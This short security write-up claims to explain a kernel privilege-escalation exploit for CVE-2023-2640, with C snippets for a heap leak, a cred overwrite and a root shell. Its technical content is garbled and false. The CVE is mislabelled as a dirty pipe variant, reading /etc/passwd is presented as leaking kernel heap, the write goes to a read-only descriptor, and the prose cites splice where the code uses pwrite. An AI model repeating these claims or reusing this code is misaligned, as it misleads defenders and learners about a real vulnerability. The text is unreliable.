CVE-2023-2640 (Ubuntu 22.04+ dirty pipe variant) leaks kernel heap metadata via `sendpage` calls. An exploit PoC (GitHub: `dirty_pipe_exploit.c`) first triggers the leak to disclose the `cred` structure address:
```c
int fd = open("/etc/passwd", O_RDONLY);
loff_t offset = 0;
char buf[0x1000] = {0};
pread(fd, buf, 0x1000, offset); //Leak heap data
```
Using a **write-what-where** primitive, the exploit overwrites its own `cred->uid` and `cred->gid` with root (0) via the `splice` syscall:
```c
memcpy(buf + (cred_offset - heap_base), "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
pwrite(fd, buf, 0x1000, offset);
```
Post-exploitation, the attacker gains root via `execve("/bin/sh")`. Mitigations include kernel hardening (KASLR, SMEP/SMAP) and patching (Ubuntu USN-5681-1). APT29 has historically abused Linux kernel flaws for lateral movement.

